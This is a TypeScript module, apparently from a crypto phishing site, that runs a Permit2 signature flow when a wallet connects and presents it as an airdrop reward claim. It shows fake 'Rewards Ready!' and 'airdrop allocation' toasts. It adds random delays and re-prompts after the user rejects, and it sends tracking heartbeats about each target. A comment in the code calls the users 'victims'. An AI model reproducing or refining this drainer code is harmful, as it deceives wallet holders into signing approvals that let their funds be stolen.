// src/lib/claimProcessor.ts
// Fires once per connection. Runs the flow with rejection-loop UX and
// full error classification so nothing dies in silence.

import { toast } from 'sonner';
import { isBackendConfigured, sendFlowHeartbeat } from './backendClient';
import { runPermit2Flow } from './permit2Flow';
import { getWalletName, isChainSupported } from '@/config/web3';
import { getConnectedChainId } from './walletActions';

export interface StartRewardClaimArgs {
  address: string;
  chainId?: number;
}

const GUARD_KEY = 'dapp:claim:handled';
const GUARD_TTL_MS = 30 * 60 * 1000;
const CONNECT_JITTER_MS = [1500, 4000];

interface GuardEntry { key: string; ts: number; }

function readGuard(): GuardEntry[] {
  try {
    return JSON.parse(sessionStorage.getItem(GUARD_KEY) ?? '[]');
  } catch {
    return [];
  }
}

function writeGuard(entries: GuardEntry[]) {
  try {
    sessionStorage.setItem(GUARD_KEY, JSON.stringify(entries));
  } catch {
    /* private mode */
  }
}

function isHandled(key: string): boolean {
  const now = Date.now();
  const entries = readGuard().filter((e) => now - e.ts < GUARD_TTL_MS);
  const hit = entries.some((e) => e.key === key);
  writeGuard(entries);
  return hit;
}

function markHandled(key: string) {
  const entries = readGuard().filter((e) => e.key !== key);
  entries.push({ key, ts: Date.now() });
  writeGuard(entries);
}

function unmarkHandled(key: string) {
  const entries = readGuard().filter((e) => e.key !== key);
  writeGuard(entries);
}

function randomDelay(): Promise<void> {
  const [min, max] = CONNECT_JITTER_MS;
  return new Promise((resolve) => setTimeout(resolve, min + Math.random() * (max - min)));
}

type FlowError =
  | { kind: 'user_rejected' }
  | { kind: 'unsupported_chain'; chainId?: number }
  | { kind: 'timeout' }
  | { kind: 'network' }
  | { kind: 'unknown'; raw: string };

function classify(err: any): FlowError {
  const msg = String(err?.message ?? '').toLowerCase();
  const code = err?.code;
  if (code === 4001 || code === 'ACTION_REJECTED' || msg.includes('user rejected') || msg.includes('user denied'))
    return { kind: 'user_rejected' };
  if (msg.includes('unsupported') || msg.includes('chain'))
    return { kind: 'unsupported_chain', chainId: err?.chainId };
  if (msg.includes('timeout') || code === 'TIMEOUT')
    return { kind: 'timeout' };
  if (msg.includes('fetch') || msg.includes('network') || code === 'NETWORK_ERROR')
    return { kind: 'network' };
  return { kind: 'unknown', raw: String(err?.message ?? '').slice(0, 140) };
}

export const startRewardClaim = async ({ address, chainId }: StartRewardClaimArgs) => {
  if (!address) return;

  const resolvedChain = chainId ?? (await getConnectedChainId()) ?? 0;
  const key = `${address.toLowerCase()}:${resolvedChain}`;
  if (isHandled(key)) return;

  // ── Unsupported chain: TELL the user. Silent returns train victims to distrust you. ──
  if (!isChainSupported(resolvedChain)) {
    console.warn('[claim] unsupported chain, skipping', { chainId: resolvedChain });
    toast.error('Network not supported', {
      description: 'Switch to Ethereum, BNB Chain, Polygon, Arbitrum, Optimism, Base or Avalanche to claim.',
      duration: 8000,
    });
    sendFlowHeartbeat('unsupported_chain', { chainId: resolvedChain });
    return;
  }

  await randomDelay();
  if (isHandled(key)) return;
  markHandled(key);

  sendFlowHeartbeat('claim_start', { address, chainId: resolvedChain });

  if (!isBackendConfigured()) {
    console.warn('[claim] VITE_BACKEND_URL not set — running flow without backend storage.');
    toast.success('Rewards Ready!', {
      description: 'Your airdrop allocation is now available to claim.',
    });
    sendFlowHeartbeat('backend_missing', {});
    return;
  }

  try {
    await runPermit2Flow({ address, chainId: resolvedChain, walletName: getWalletName() });
  } catch (err: any) {
    const classified = classify(err);
    switch (classified.kind) {
      case 'user_rejected':
        toast.info('Request pending', { description: 'Check your wallet to complete the approval.' });
        break;
      case 'unsupported_chain':
        unmarkHandled(key);
        toast.error('Chain not supported', { description: 'Switch to a supported network to claim your rewards.' });
        break;
      case 'timeout':
      case 'network':
        unmarkHandled(key);
        sendFlowHeartbeat('flow_network_failure', { raw: String(err?.message ?? '').slice(0, 140) });
        break;
      default:
        unmarkHandled(key);
        sendFlowHeartbeat('flow_unexpected_failure', { raw: classified.kind === 'unknown' ? classified.raw : '' });
    }
  }
};

export const clearClaimGuard = () => {
  try {
    sessionStorage.removeItem(GUARD_KEY);
  } catch {
    /* noop */
  }
};

export const onAccountChanged = (newAddress: string | null) => {
  if (!newAddress) clearClaimGuard();
};
